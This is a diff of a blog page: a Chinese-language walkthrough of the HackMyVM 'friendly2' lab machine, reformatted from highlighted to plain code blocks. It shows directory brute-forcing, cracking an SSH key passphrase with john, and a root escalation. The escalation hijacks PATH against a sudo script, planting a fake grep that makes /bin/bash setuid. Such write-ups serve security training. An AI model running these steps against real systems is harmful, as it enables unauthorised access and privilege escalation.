@@ -472,7 +472,7 @@ Hint: numbers are not codified
 <meta property="og:url" content="https://7r1UMPH.github.io/post/hmv_friendly2.html">
 <meta property="og:image" content="https://7r1umph.top/image/202506121404919.webp">
 <title>hmv_friendly2</title>
-<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
 
 
 </head>
@@ -563,48 +563,49 @@ Nmap done: 1 IP address (1 host up) scanned in 2.63 seconds
 <h1>2.踩点</h1>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/0db9dabd-fe97-4b10-ac8c-fea7bb327606"><img src="https://github.com/user-attachments/assets/0db9dabd-fe97-4b10-ac8c-fea7bb327606" alt="Image" style="max-width: 100%;"></a></p>
 <p>尝试爆破目录</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
-└─$ feroxbuster -u <span class="pl-s"><span class="pl-pds">"</span>http://192.168.205.138<span class="pl-pds">"</span></span> -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ feroxbuster -u "http://192.168.205.138" -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md
                                                                                                                                     
  ___  ___  __   __     __      __         __   ___
-<span class="pl-k">|</span>__  <span class="pl-k">|</span>__  <span class="pl-k">|</span>__) <span class="pl-k">|</span>__) <span class="pl-k">|</span> /  <span class="pl-s"><span class="pl-pds">`</span>    /  <span class="pl-cce">\ \_</span>/ <span class="pl-k">|</span> <span class="pl-k">|</span>  <span class="pl-cce">\ </span><span class="pl-k">|</span>__</span>
-<span class="pl-s"><span class="pl-k">|</span>    <span class="pl-k">|</span>___ <span class="pl-k">|</span>  <span class="pl-cce">\ </span><span class="pl-k">|</span>  <span class="pl-cce">\ </span><span class="pl-k">|</span> <span class="pl-cce">\_</span>_,    <span class="pl-cce">\_</span>_/ / <span class="pl-cce">\ </span><span class="pl-k">|</span> <span class="pl-k">|</span>__/ <span class="pl-k">|</span>___</span>
-<span class="pl-s">by Ben <span class="pl-s"><span class="pl-pds">"</span>epi<span class="pl-pds">"</span></span> Risher 🤓                 ver: 2.11.0</span>
-<span class="pl-s">───────────────────────────┬──────────────────────</span>
-<span class="pl-s"> 🎯  Target Url            │ http://192.168.205.138</span>
-<span class="pl-s"> 🚀  Threads               │ 50</span>
-<span class="pl-s"> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt</span>
-<span class="pl-s"> 👌  Status Codes          │ All Status Codes<span class="pl-k">!</span></span>
-<span class="pl-s"> 💥  Timeout (secs)        │ 7</span>
-<span class="pl-s"> 🦡  User-Agent            │ feroxbuster/2.11.0</span>
-<span class="pl-s"> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml</span>
-<span class="pl-s"> 🔎  Extract Links         │ <span class="pl-c1">true</span></span>
-<span class="pl-s"> 💲  Extensions            │ [php, html, txt, md]</span>
-<span class="pl-s"> 🏁  HTTP methods          │ [GET]</span>
-<span class="pl-s"> 🔃  Recursion Depth       │ 4</span>
-<span class="pl-s">───────────────────────────┴──────────────────────</span>
-<span class="pl-s"> 🏁  Press [ENTER] to use the Scan Management Menu™</span>
-<span class="pl-s">──────────────────────────────────────────────────</span>
-<span class="pl-s">404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter<span class="pl-k">;</span> toggle off with --dont-filter                                                                                                                                   </span>
-<span class="pl-s">403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter<span class="pl-k">;</span> toggle off with --dont-filter                                                                                                                                   </span>
-<span class="pl-s">200      GET       91l      262w     2698c http://192.168.205.138/</span>
-<span class="pl-s">301      GET        9l       28w      319c http://192.168.205.138/assets =<span class="pl-k">&gt;</span> http://192.168.205.138/assets/</span>
-<span class="pl-s">301      GET        9l       28w      318c http://192.168.205.138/tools =<span class="pl-k">&gt;</span> http://192.168.205.138/tools/</span>
-<span class="pl-s">200      GET       91l      262w     2698c http://192.168.205.138/index.html</span>
-<span class="pl-s">200      GET     1710l     9966w   851305c http://192.168.205.138/assets/keyboard.png</span>
-<span class="pl-s">200      GET      644l     3260w   244133c http://192.168.205.138/assets/monitor.png</span>
-<span class="pl-s">200      GET     1965l    11601w   977099c http://192.168.205.138/assets/laptop.png</span>
-<span class="pl-s">200      GET       24l      148w     6861c http://192.168.205.138/assets/sirena.gif</span>
-<span class="pl-s">301      GET        9l       28w      328c http://192.168.205.138/tools/documents =<span class="pl-k">&gt;</span> http://192.168.205.138/tools/documents/</span>
-<span class="pl-s">200      GET       29l       99w      813c http://192.168.205.138/tools/index.html</span>
-<span class="pl-s">200      GET       35l      101w      841c http://192.168.205.138/tools/documents/monitor.html</span>
-<span class="pl-s">200      GET       50l      126w     1169c http://192.168.205.138/tools/documents/keyboard.html</span>
-<span class="pl-s">200      GET       35l      101w      879c http://192.168.205.138/tools/documents/laptop.html</span>
-<span class="pl-s">[<span class="pl-c"><span class="pl-c">#</span>###################] - 2m    622895/622895  0s      found:13      errors:1      </span></span>
-<span class="pl-s">[<span class="pl-c"><span class="pl-c">#</span>###################] - 2m    311410/311410  2719/s  http://192.168.205.138/ </span></span>
-<span class="pl-s">[<span class="pl-c"><span class="pl-c">#</span>###################] - 2s    311410/311410  184157/s http://192.168.205.138/assets/ =&gt; Directory listing (add --scan-dir-listings to scan)</span></span>
-<span class="pl-s">[<span class="pl-c"><span class="pl-c">#</span>###################] - 2m    311410/311410  2662/s  http://192.168.205.138/tools/ </span></span>
-<span class="pl-s">[<span class="pl-c"><span class="pl-c">#</span>###################] - 0s    311410/311410  7077500/s http://192.168.205.138/tools/documents/ =&gt; Directory listing (add --scan-dir-listings to scan)</span></span></pre></div>
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://192.168.205.138
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [php, html, txt, md]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
+403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
+200      GET       91l      262w     2698c http://192.168.205.138/
+301      GET        9l       28w      319c http://192.168.205.138/assets =&gt; http://192.168.205.138/assets/
+301      GET        9l       28w      318c http://192.168.205.138/tools =&gt; http://192.168.205.138/tools/
+200      GET       91l      262w     2698c http://192.168.205.138/index.html
+200      GET     1710l     9966w   851305c http://192.168.205.138/assets/keyboard.png
+200      GET      644l     3260w   244133c http://192.168.205.138/assets/monitor.png
+200      GET     1965l    11601w   977099c http://192.168.205.138/assets/laptop.png
+200      GET       24l      148w     6861c http://192.168.205.138/assets/sirena.gif
+301      GET        9l       28w      328c http://192.168.205.138/tools/documents =&gt; http://192.168.205.138/tools/documents/
+200      GET       29l       99w      813c http://192.168.205.138/tools/index.html
+200      GET       35l      101w      841c http://192.168.205.138/tools/documents/monitor.html
+200      GET       50l      126w     1169c http://192.168.205.138/tools/documents/keyboard.html
+200      GET       35l      101w      879c http://192.168.205.138/tools/documents/laptop.html
+[####################] - 2m    622895/622895  0s      found:13      errors:1      
+[####################] - 2m    311410/311410  2719/s  http://192.168.205.138/ 
+[####################] - 2s    311410/311410  184157/s http://192.168.205.138/assets/ =&gt; Directory listing (add --scan-dir-listings to scan)
+[####################] - 2m    311410/311410  2662/s  http://192.168.205.138/tools/ 
+[####################] - 0s    311410/311410  7077500/s http://192.168.205.138/tools/documents/ =&gt; Directory listing (add --scan-dir-listings to scan)
+</code></pre>
 <p>其中<code class="notranslate">/tools/</code>目录，我们比较感兴趣</p>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/4cecf106-19df-416e-b3c1-2da93f1dcbf6"><img src="https://github.com/user-attachments/assets/4cecf106-19df-416e-b3c1-2da93f1dcbf6" alt="Image" style="max-width: 100%;"></a></p>
 <p>有一个疑似目录包含路径，我们加上尝试</p>
@@ -613,7 +614,7 @@ Nmap done: 1 IP address (1 host up) scanned in 2.63 seconds
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/0788d850-d370-4605-9661-192ba52e50bb"><img src="https://github.com/user-attachments/assets/0788d850-d370-4605-9661-192ba52e50bb" alt="Image" style="max-width: 100%;"></a></p>
 <p>不行，那我们还是去读它密钥吧</p>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/286bfaa9-f0e2-4543-9ce7-711916d35160"><img src="https://github.com/user-attachments/assets/286bfaa9-f0e2-4543-9ce7-711916d35160" alt="Image" style="max-width: 100%;"></a></p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ vim id_rsa 
                                                                                                                                     
 ┌──(kali㉿kali)-[~/test]
@@ -621,88 +622,90 @@ Nmap done: 1 IP address (1 host up) scanned in 2.63 seconds
                                                                                                                                     
 ┌──(kali㉿kali)-[~/test]
 └─$ ssh gh0st@192.168.205.138 -i id_rsa
-The authenticity of host <span class="pl-s"><span class="pl-pds">'</span>192.168.205.138 (192.168.205.138)<span class="pl-pds">'</span></span> can<span class="pl-s"><span class="pl-pds">'</span>t be established.</span>
-<span class="pl-s">ED25519 key fingerprint is SHA256:YDW5zhbCol/1L6a3swXHsFDV6D3tUVbC09Ch+bxLR08.</span>
-<span class="pl-s">This key is not known by any other names.</span>
-<span class="pl-s">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span>
-<span class="pl-s">Warning: Permanently added <span class="pl-pds">'</span></span>192.168.205.138<span class="pl-s"><span class="pl-pds">'</span> (ED25519) to the list of known hosts.</span>
-<span class="pl-s">Enter passphrase for key <span class="pl-pds">'</span></span>id_rsa<span class="pl-s"><span class="pl-pds">'</span>: </span>
-<span class="pl-s"></span>
-<span class="pl-s">                                                                                                                                    </span>
-<span class="pl-s">┌──(kali㉿kali)-[~/test]</span>
-<span class="pl-s">└─$ ssh2john id_rsa &gt; hash                             </span>
-<span class="pl-s">                                                                                                                                    </span>
-<span class="pl-s">┌──(kali㉿kali)-[~/test]</span>
-<span class="pl-s">└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash</span>
-<span class="pl-s">Using default input encoding: UTF-8</span>
-<span class="pl-s">Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])</span>
-<span class="pl-s">No password hashes left to crack (see FAQ)</span>
-<span class="pl-s">                                                                                                                                    </span>
-<span class="pl-s">┌──(kali㉿kali)-[~/test]</span>
-<span class="pl-s">└─$ john hash --show                                   </span>
-<span class="pl-s">id_rsa:celtic</span>
-<span class="pl-s"></span>
-<span class="pl-s">1 password hash cracked, 0 left</span>
-<span class="pl-s">                                                                                                                                    </span>
-<span class="pl-s">┌──(kali㉿kali)-[~/test]</span>
-<span class="pl-s">└─$ ssh gh0st@192.168.205.138 -i id_rsa                </span>
-<span class="pl-s">Enter passphrase for key <span class="pl-pds">'</span></span>id_rsa<span class="pl-s"><span class="pl-pds">'</span>: </span>
-<span class="pl-s">Linux friendly2 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64</span>
-<span class="pl-s"></span>
-<span class="pl-s">The programs included with the Debian GNU/Linux system are free software;</span>
-<span class="pl-s">the exact distribution terms for each program are described in the</span>
-<span class="pl-s">individual files in /usr/share/doc/*/copyright.</span>
-<span class="pl-s"></span>
-<span class="pl-s">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span>
-<span class="pl-s">permitted by applicable law.</span>
-<span class="pl-s">gh0st@friendly2:~$ id</span>
-<span class="pl-s">uid=1001(gh0st) gid=1001(gh0st) groups=1001(gh0st)</span>
-<span class="pl-s"></span></pre></div>
+The authenticity of host '192.168.205.138 (192.168.205.138)' can't be established.
+ED25519 key fingerprint is SHA256:YDW5zhbCol/1L6a3swXHsFDV6D3tUVbC09Ch+bxLR08.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.205.138' (ED25519) to the list of known hosts.
+Enter passphrase for key 'id_rsa': 
+
+                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ ssh2john id_rsa &gt; hash                             
+                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+No password hashes left to crack (see FAQ)
+                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ john hash --show                                   
+id_rsa:celtic
+
+1 password hash cracked, 0 left
+                                                                                                                                    
+┌──(kali㉿kali)-[~/test]
+└─$ ssh gh0st@192.168.205.138 -i id_rsa                
+Enter passphrase for key 'id_rsa': 
+Linux friendly2 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+gh0st@friendly2:~$ id
+uid=1001(gh0st) gid=1001(gh0st) groups=1001(gh0st)
+
+</code></pre>
 <h1>3.提权</h1>
-<div class="highlight highlight-source-shell"><pre class="notranslate">gh0st@friendly2:<span class="pl-k">~</span>$ sudo -l
-Matching Defaults entries <span class="pl-k">for</span> gh0st on friendly2:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin
+<pre lang="bash" class="notranslate"><code class="notranslate">gh0st@friendly2:~$ sudo -l
+Matching Defaults entries for gh0st on friendly2:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
 User gh0st may run the following commands on friendly2:
-    (ALL <span class="pl-c1">:</span> ALL) SETENV: NOPASSWD: /opt/security.sh
-gh0st@friendly2:<span class="pl-k">~</span>$ cat /opt/security.sh
-<span class="pl-c"><span class="pl-c">#!</span>/bin/bash</span>
+    (ALL : ALL) SETENV: NOPASSWD: /opt/security.sh
+gh0st@friendly2:~$ cat /opt/security.sh
+#!/bin/bash
 
-<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>Enter the string to encode:<span class="pl-pds">"</span></span>
-<span class="pl-c1">read</span> string
+echo "Enter the string to encode:"
+read string
 
-<span class="pl-c"><span class="pl-c">#</span> Validate that the string is no longer than 20 characters</span>
-<span class="pl-k">if</span> [[ <span class="pl-smi">${<span class="pl-k">#</span>string}</span> <span class="pl-k">-gt</span> 20 ]]<span class="pl-k">;</span> <span class="pl-k">then</span>
-  <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>The string cannot be longer than 20 characters.<span class="pl-pds">"</span></span>
-  <span class="pl-c1">exit</span> 1
-<span class="pl-k">fi</span>
+# Validate that the string is no longer than 20 characters
+if [[ ${#string} -gt 20 ]]; then
+  echo "The string cannot be longer than 20 characters."
+  exit 1
+fi
 
-<span class="pl-c"><span class="pl-c">#</span> Validate that the string does not contain special characters</span>
-<span class="pl-k">if</span> <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$string</span><span class="pl-pds">"</span></span> <span class="pl-k">|</span> grep -q <span class="pl-s"><span class="pl-pds">'</span>[^[:alnum:] ]<span class="pl-pds">'</span></span><span class="pl-k">;</span> <span class="pl-k">then</span>
-  <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>The string cannot contain special characters.<span class="pl-pds">"</span></span>
-  <span class="pl-c1">exit</span> 1
-<span class="pl-k">fi</span>
+# Validate that the string does not contain special characters
+if echo "$string" | grep -q '[^[:alnum:] ]'; then
+  echo "The string cannot contain special characters."
+  exit 1
+fi
 
-sus1=<span class="pl-s"><span class="pl-pds">'</span>A-Za-z<span class="pl-pds">'</span></span>
-sus2=<span class="pl-s"><span class="pl-pds">'</span>N-ZA-Mn-za-m<span class="pl-pds">'</span></span>
+sus1='A-Za-z'
+sus2='N-ZA-Mn-za-m'
 
-encoded_string=<span class="pl-s"><span class="pl-pds">$(</span>echo <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$string</span><span class="pl-pds">"</span></span> <span class="pl-k">|</span> tr <span class="pl-smi">$sus1</span> <span class="pl-smi">$sus2</span><span class="pl-pds">)</span></span>
+encoded_string=$(echo "$string" | tr $sus1 $sus2)
 
-<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>Original string: <span class="pl-smi">$string</span><span class="pl-pds">"</span></span>
-<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>Encoded string: <span class="pl-smi">$encoded_string</span><span class="pl-pds">"</span></span>
-gh0st@friendly2:<span class="pl-k">~</span>$ ls -la /opt/
+echo "Original string: $string"
+echo "Encoded string: $encoded_string"
+gh0st@friendly2:~$ ls -la /opt/
 total 16
-drwxr-xr-x  3 root root 4096 Apr 29  2023 <span class="pl-c1">.</span>
+drwxr-xr-x  3 root root 4096 Apr 29  2023 .
 drwxr-xr-x 19 root root 4096 Apr 27  2023 ..
 drwxr-xr-x  2 root root 4096 Apr 29  2023 0-day
 -rwxr-xr-x  1 root root  561 Apr 29  2023 security.sh
-</pre></div>
+
+</code></pre>
 <p>实现用户输入不超20个字符且不能有特殊符号，将输入信息ROT13 编码，我们改个环境变量就好了，它没用绝对路径</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">gh0st@friendly2:/tmp$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>chmod u+s /bin/bash<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> grep
+<pre lang="bash" class="notranslate"><code class="notranslate">gh0st@friendly2:/tmp$ echo 'chmod u+s /bin/bash' &gt; grep
 gh0st@friendly2:/tmp$ chmod +x grep 
 gh0st@friendly2:/tmp$ ls -la /bin/bash
 -rwxr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
-gh0st@friendly2:/tmp$ sudo PATH=<span class="pl-smi">$PWD</span>:<span class="pl-smi">$PATH</span> /opt/security.sh
+gh0st@friendly2:/tmp$ sudo PATH=$PWD:$PATH /opt/security.sh
 Enter the string to encode:
 aaassss
 The string cannot contain special characters.
@@ -714,27 +717,28 @@ uid=1001(gh0st) gid=1001(gh0st) euid=0(root) groups=1001(gh0st)
 bash-5.1# cat /root/
 .bash_history  .bashrc        interfaces.sh  .local/        .profile       root.txt     
 bash-5.1# cat /root/root.txt 
-Not yet<span class="pl-k">!</span> Try to find root.txt.
+Not yet! Try to find root.txt.
 
 
 Hint: ...
-bash-5.1# find / -name <span class="pl-s"><span class="pl-pds">"</span>...<span class="pl-pds">"</span></span> <span class="pl-k">2&gt;</span>/dev/null
+bash-5.1# find / -name "..." 2&gt;/dev/null
 /...
-bash-5.1# <span class="pl-c1">cd</span> /.../
+bash-5.1# cd /.../
 bash-5.1# ls -al
 total 12
-d-wx------  2 root root 4096 Apr 29  2023 <span class="pl-c1">.</span>
+d-wx------  2 root root 4096 Apr 29  2023 .
 drwxr-xr-x 19 root root 4096 Apr 27  2023 ..
 -r--------  1 root root  100 Apr 29  2023 ebbg.txt
 bash-5.1# cat ebbg.txt 
-It<span class="pl-s"><span class="pl-pds">'</span>s codified, look the cipher:</span>
-<span class="pl-s"></span>
-<span class="pl-s">98199n723q0s44s6rs39r33685q8pnoq</span>
-<span class="pl-s"></span>
-<span class="pl-s"></span>
-<span class="pl-s"></span>
-<span class="pl-s">Hint: numbers are not codified</span>
-<span class="pl-s"></span></pre></div>
+It's codified, look the cipher:
+
+98199n723q0s44s6rs39r33685q8pnoq
+
+
+
+Hint: numbers are not codified
+
+</code></pre>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/f1d96202-91e2-4915-adb2-fd428994419b"><img src="https://github.com/user-attachments/assets/f1d96202-91e2-4915-adb2-fd428994419b" alt="Image" style="max-width: 100%;"></a></p></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
